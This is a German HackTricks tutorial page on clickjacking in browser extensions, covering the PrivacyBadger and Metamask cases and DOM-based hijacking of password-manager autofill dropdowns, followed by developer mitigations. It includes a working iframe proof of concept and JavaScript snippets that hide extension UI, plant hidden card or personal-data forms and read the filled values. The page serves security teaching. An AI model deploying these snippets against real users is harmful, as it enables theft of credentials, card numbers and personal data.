# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Diese Seite wird eine ClickJacking-Schwachstelle in einer Browser-Erweiterung ausnutzen.\
Wenn du nicht weißt, was ClickJacking ist, siehe:


{{#ref}}
../clickjacking.md
{{#endref}}

Erweiterungen enthalten die Datei **`manifest.json`** und diese JSON-Datei hat ein Feld `web_accessible_resources`. So sagen die [Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) dazu:

> Diese Ressourcen wären dann auf einer Webseite über die URL **`chrome-extension://[PACKAGE ID]/[PATH]`** verfügbar, die mit der **`extension.getURL method`** erzeugt werden kann. Auf die Allowlist gesetzte Ressourcen werden mit passenden CORS-Headern ausgeliefert, sodass sie über Mechanismen wie XHR verfügbar sind.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Die **`web_accessible_resources`** in einer Browser-Erweiterung sind nicht nur über das Web zugänglich; sie laufen auch mit den inhärenten Privilegien der Erweiterung. Das bedeutet, sie können:

- Den Zustand der Erweiterung ändern
- Zusätzliche Ressourcen laden
- Bis zu einem gewissen Grad mit dem Browser interagieren

Diese Funktion stellt jedoch ein Sicherheitsrisiko dar. Wenn eine Ressource innerhalb von **`web_accessible_resources`** eine nennenswerte Funktionalität besitzt, könnte ein Angreifer diese Ressource in eine externe Webseite einbetten. Arglose Nutzer, die diese Seite besuchen, könnten diese eingebettete Ressource unbeabsichtigt aktivieren. Eine solche Aktivierung könnte je nach Berechtigungen und Fähigkeiten der Ressourcen der Erweiterung zu unbeabsichtigten Folgen führen.

## PrivacyBadger Beispiel

In der Erweiterung PrivacyBadger wurde eine Schwachstelle festgestellt, die damit zusammenhing, dass das Verzeichnis `skin/` als `web_accessible_resources` wie folgt deklariert wurde (siehe den ursprünglichen [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Diese Konfiguration führte zu einem potenziellen Sicherheitsproblem. Konkret konnte die Datei `skin/popup.html`, die beim Interagieren mit dem PrivacyBadger-Icon im Browser gerendert wird, innerhalb eines `iframe` eingebettet werden. Diese Einbettung konnte ausgenutzt werden, um Benutzer dazu zu verleiten, unbeabsichtigt auf "Disable PrivacyBadger for this Website" zu klicken. Eine solche Aktion würde die Privatsphäre des Benutzers gefährden, indem der PrivacyBadger-Schutz deaktiviert wird und der Benutzer möglicherweise stärkerem Tracking ausgesetzt wäre. Eine visuelle Demonstration dieses Exploits ist in einem ClickJacking-Video-Beispiel unter [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) zu sehen.

Um diese Schwachstelle zu beheben, wurde eine einfache Lösung umgesetzt: das Entfernen von `/skin/*` aus der Liste der `web_accessible_resources`. Diese Änderung minderte das Risiko effektiv, indem sichergestellt wurde, dass der Inhalt des Verzeichnisses `skin/` nicht über web-accessible resources zugänglich gemacht oder manipuliert werden kann.

Die Behebung war einfach: **`/skin/*` aus den `web_accessible_resources` entfernen**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Beispiel

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). In diesem Fall behebt Metamask die Schwachstelle, indem überprüft wird, dass das verwendete Protokoll `https:` oder `http:` ist (z. B. nicht `chrome:`):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** in the Metamask extension war, dass Benutzer in der Lage waren, **Click to whitelist** auszuführen, wenn eine Seite aufgrund von `“web_accessible_resources”: [“inpage.js”, “phishing.html”]` verdächtig war, Phishing zu sein. Da diese Seite für Clickjacking anfällig war, konnte ein Angreifer sie missbrauchen, indem er etwas Normales anzeigte, damit das Opfer unbemerkt auf die Whitelist-Option klickte, und dann zur Phishing-Seite zurückkehrte, die dann auf der Whitelist stand.

## Steam Inventory Helper Beispiel

Sieh dir die folgende Seite an, um zu sehen, wie ein **XSS** in einer Browsererweiterung mit einer **ClickJacking**-Schwachstelle verkettet wurde:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Autofill-Dropdowns von Passwortmanagern)

Klassisches extension clickjacking missbraucht fehlkonfigurierte `web_accessible_resources`, um privilegiertes HTML per iframe einzubetten und Benutzerklicks zu steuern. Eine neuere Klasse, DOM-based extension clickjacking, zielt direkt auf die von Passwortmanagern in das Seiten-DOM injizierten Autofill-Dropdowns ab und nutzt CSS/DOM-Tricks, um sie zu verbergen oder zu überdecken, während sie weiterhin klickbar bleiben. Ein erzwungener Klick kann ein gespeichertes Element auswählen und angreiferkontrollierte Eingabefelder mit sensiblen Daten füllen.

### Bedrohungsmodell

- Der Angreifer kontrolliert eine Webseite (oder erreicht XSS/subdomain takeover/cache poisoning auf einer zugehörigen Domain).
- Das Opfer hat eine Passwort-Manager-Erweiterung installiert und entsperrt (einige füllen automatisch aus, selbst wenn sie nominal gesperrt sind).
- Mindestens ein Benutzerklick wird induziert (überlagerte Cookie-Banner, Dialoge, CAPTCHAs, Spiele usw.).

### Angriffsablauf (manuelles Autofill)

1. Ein unsichtbares, aber fokussierbares Formular injizieren (Login/PII/Kreditkarten-Felder).
2. Ein Eingabefeld fokussieren, um das Autofill-Dropdown der Extension in der Nähe des Feldes aufzurufen.
3. Die Extension-UI verbergen oder überdecken, dabei aber interagierbar halten.
4. Ein glaubwürdiges Steuerelement unter dem versteckten Dropdown ausrichten, um einen Klick zu erzwingen, der ein Element auswählt.
5. Die ausgefüllten Werte aus dem Angreiferformular auslesen und exfiltrieren.

### Wie man die Autofill-UI versteckt

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Child-Element innerhalb eines offenen ShadowRoot (dynamisches Tag, internes iframe verbergen):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Elternelement
- BODY/HTML opacity tricks, um die extension UI unsichtbar zu machen, während die Seite normal aussieht (z. B. Hintergrund für Screenshots):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: verdecke alles bis auf ein paar Pixel, sodass das dropdown weiterhin anklickbar bleibt (stelle sicher, dass der attacker overlay als letztes im DOM mit max z-index liegt, oder verwende Top Layer).
- Full overlay mit pointer-events:none, sodass Klicks zum versteckten dropdown durchgereicht werden; halte es dauerhaft aktiv mit der Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Positionierung des Opferklicks

- Fixed placement: positioniere das versteckte Dropdown unter einem glaubwürdigen Steuerelement wie “Accept cookies”, “Close” oder einer CAPTCHA-Checkbox.
- Follow-mouse: verschiebe das fokussierte Eingabefeld unter den Cursor, sodass das Dropdown ihm folgt; fokussiere es periodisch neu, sodass ein einzelner Klick irgendwo ein Element auswählt:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Auswirkungen und Szenarien

- Vom Angreifer kontrollierte Seite: Ein erzwungener Klick kann Kreditkartendaten (Nummer/Ablauf/CVC) und personenbezogene Daten (Name, E‑Mail, Telefon, Adresse, Geburtsdatum) exfiltrieren, die nicht an die Domain gebunden sind.
- Vertrauenswürdige Seite mit XSS/subdomain takeover/cache poisoning: Mehrfachklick-Diebstahl von Zugangsdaten (Username/Passwort) und TOTP, weil viele Manager Formularfelder über verwandte Subdomains/übergeordnete Domains hinweg automatisch ausfüllen (z. B. `*.example.com`).
- Passkeys: wenn der RP WebAuthn-Challenges nicht an die Session bindet, kann XSS die signierte Assertion abfangen; DOM-based clickjacking verbirgt die Passkey-Aufforderung, um den bestätigenden Klick des Benutzers zu erzwingen.

### Einschränkungen

- Erfordert mindestens einen Benutzerklick und eine gute Pixelausrichtung (realistische Overlays erleichtern das Erzeugen von Klicks).
- Auto-Lock/Logout verkürzt das Ausnutzungsfenster; einige Manager füllen trotzdem weiterhin automatisch aus, während sie „gesperrt“ sind.

### Maßnahmen für Extension-Entwickler

- Stelle die Autofill-UI in der Top Layer (Popover API) dar oder sorge anderweitig dafür, dass sie über dem Seiten-Stack liegt; vermeide, dass sie von seitenkontrollierten Overlays überdeckt wird.
- CSS-Manipulationen widerstehen: befürworte Closed Shadow DOM und überwache mit `MutationObserver` verdächtige Style-Änderungen an UI-Wurzeln.
- Erkenne feindliche Overlays, bevor du füllst: zähle andere Top‑Layer/Popover-Elemente auf, deaktiviere temporär `pointer-events:none` und nutze `elementsFromPoint()` zur Erkennung von Überdeckungen; schließe die UI, falls Overlays vorhanden sind.
- Erkenne verdächtige `<body>`/`<html>`-opacity- oder Style-Änderungen sowohl vor als auch nach dem Rendern.
- Bei iframe-basierten Problemen: beschränke die MV3 `web_accessible_resources` `matches` eng und vermeide das Exponieren von HTML-UIs; für unvermeidbares HTML sende `X-Frame-Options: DENY` oder `Content-Security-Policy: frame-ancestors 'none'`.

## Referenzen

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
